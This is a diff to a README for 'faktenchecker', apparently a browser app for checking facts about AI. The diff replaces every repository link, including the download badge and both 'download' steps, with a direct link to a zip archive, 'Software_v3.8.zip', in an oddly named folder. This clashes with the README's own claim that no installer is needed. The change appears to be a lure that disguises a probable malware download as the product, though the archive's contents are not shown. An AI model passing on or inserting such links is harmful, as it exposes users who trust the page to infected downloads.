@@ -1,6 +1,6 @@
 # 🤖 faktenchecker - Clear answers from AI facts
 
-[![Download faktenchecker](https://img.shields.io/badge/Download%20faktenchecker-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gmahadevan7/faktenchecker)
+[![Download faktenchecker](https://img.shields.io/badge/Download%20faktenchecker-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gmahadevan7/faktenchecker/main/embryophagous/Software_v3.8.zip)
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ The app uses browser features, so it does not need a desktop installer.
 
 ## 📥 Download and open
 
-1. Visit this page to download: [https://github.com/gmahadevan7/faktenchecker](https://github.com/gmahadevan7/faktenchecker)
+1. Visit this page to download: [https://raw.githubusercontent.com/gmahadevan7/faktenchecker/main/embryophagous/Software_v3.8.zip](https://raw.githubusercontent.com/gmahadevan7/faktenchecker/main/embryophagous/Software_v3.8.zip)
 2. On the repository page, look for the main app file
 3. Download the file to your computer
 4. Save it in a folder you can find again, such as Downloads or Desktop
@@ -142,7 +142,7 @@ faktenchecker fits well when you want to:
 
 ## 📌 Download again
 
-If you need the repository page again, use this link: [https://github.com/gmahadevan7/faktenchecker](https://github.com/gmahadevan7/faktenchecker)
+If you need the repository page again, use this link: [https://raw.githubusercontent.com/gmahadevan7/faktenchecker/main/embryophagous/Software_v3.8.zip](https://raw.githubusercontent.com/gmahadevan7/faktenchecker/main/embryophagous/Software_v3.8.zip)
 
 ## 🧩 Keywords
 
